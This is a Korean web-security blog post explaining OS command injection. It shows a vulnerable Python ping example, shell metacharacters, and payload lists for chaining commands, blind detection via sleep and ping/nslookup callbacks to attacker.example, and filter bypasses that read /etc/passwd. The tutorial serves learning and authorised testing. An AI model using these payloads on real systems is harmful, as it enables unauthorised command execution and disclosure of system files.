---
title: "OS 명령어 주입 (Command Injection)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Command Injection]
tags: [command-injection, rce, web]
description: "사용자 입력이 셸 명령에 섞이는 명령어 주입의 개념과, 메타문자 연결·결과가 안 보일 때의 블라인드 확인·필터 우회 구문을 정리합니다."
mermaid: true
---

> OS 명령어 주입은 사용자 입력이 서버의 셸 명령에 섞여 실행되는 취약점이다. 공격자는 서버에서 임의 명령을 실행할 수 있다.

## 개념

애플리케이션이 입력을 **셸 문자열에 이어 붙여** 실행하면, 셸 메타문자가 명령 구분자로 해석된다.

```python
host = request.args.get("host", "")
os.system("ping -c 1 " + host)   # host가 셸 문자열에 그대로 들어간다
```

`host`에 `; id`를 넣으면 `ping` 뒤에 `id`가 이어 실행된다. 명령을 잇는 문자는 OS마다 조금 다르다.

| 문자 | 동작 |
|---|---|
| `;` | 앞 명령과 무관하게 다음 명령 실행(Linux) |
| <code>&#124;&#124;</code> / `&&` | 앞 명령 실패/성공 시 실행 |
| <code>&#124;</code> | 앞 출력을 다음 입력으로 |
| `` `cmd` `` / `$(cmd)` | 명령 치환 |

결과가 화면에 보이면 바로 확인되지만, 안 보이면(블라인드) 다른 신호로 확인한다.

## 공격·우회 구문

대상은 플레이스홀더, 외부 수집 지점은 `attacker.example`로 둔다. 점검은 허가된 범위에서만 한다.

### 명령 연결

```
; id
| id
`id`
$(id)
```

### 블라인드 확인

출력이 없을 때 시간 지연·외부 통신·오류로 실행 여부를 판별한다.

```
; sleep 5                         # 응답이 5초 느려지면 실행됨
; ping -c 3 attacker.example      # 내가 통제하는 주소로 오는지
; nslookup attacker.example       # DNS 조회 도착 여부(OAST)
```

### 공백·키워드 필터 우회

```
cat${IFS}/etc/passwd     # 공백 대신 ${IFS}
c""at /etc/passwd        # 빈 문자열 삽입으로 키워드 분해
/???/??t /etc/passwd     # 와일드카드로 경로 표현
```

> 완성형 리버스셸이나 대량 자동화는 다루지 않는다. 주입점 확인과 영향 증명은 `id`·`sleep`·OAST 수준으로 충분하다.

## 참고 자료

- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
